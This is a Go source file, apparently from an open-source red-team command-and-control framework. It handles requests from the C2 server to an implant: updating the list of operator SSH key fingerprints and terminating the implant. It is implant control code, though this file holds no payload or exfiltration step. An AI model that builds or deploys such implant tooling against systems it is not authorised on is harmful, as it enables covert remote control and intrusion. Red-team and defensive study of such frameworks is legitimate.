package main

/*
 * c2reqs.go
 * Requests from C2 to implant
 * By J. Stuart McMurray
 * Created 20220327
 * Last Modified 20220329
 */

import (
	"os"

	"github.com/magisterquis/jec2/internal/common"
	"golang.org/x/crypto/ssh"
)

// HandleC2Reqs handles global requests from the C2 server
func HandleC2Reqs(cc ssh.Conn, reqs <-chan *ssh.Request) {
	for req := range reqs {
		switch t := req.Type; t {
		case common.Fingerprints:
			go handleFingerprintsRequest(req)
		case common.Die:
			go handleDieRequest(req)
		default:
			Logf("Unknown C2 request type %s", t)
			req.Reply(false, nil)
		}
	}
}

/* handleFingerprintsRequest handles a request to set fingerprints. */
func handleFingerprintsRequest(req *ssh.Request) {
	/* Try to set the keys. */
	err := SetAllowedOperatorKeys(string(req.Payload))
	if nil == err { /* Life's easy sometimes. */
		Logf("Updated list of operator key figerprints")
		req.Reply(true, nil)
		return
	}
	Logf("Error setting operator keys from %q: %s", req.Payload, err)
	req.Reply(false, []byte(err.Error()))
}

/* handleDieRequest handles a request to terminate. */
func handleDieRequest(req *ssh.Request) {
	/* Warn all the operators. */
	AllShells(func(tag string, s Shell) {
		s.Printf("Implant terminating.\n")
	}, true)
	/* Tell the server we got the message. */
	req.Reply(true, nil)
	Logf("Terminating")
	os.Exit(0)
}
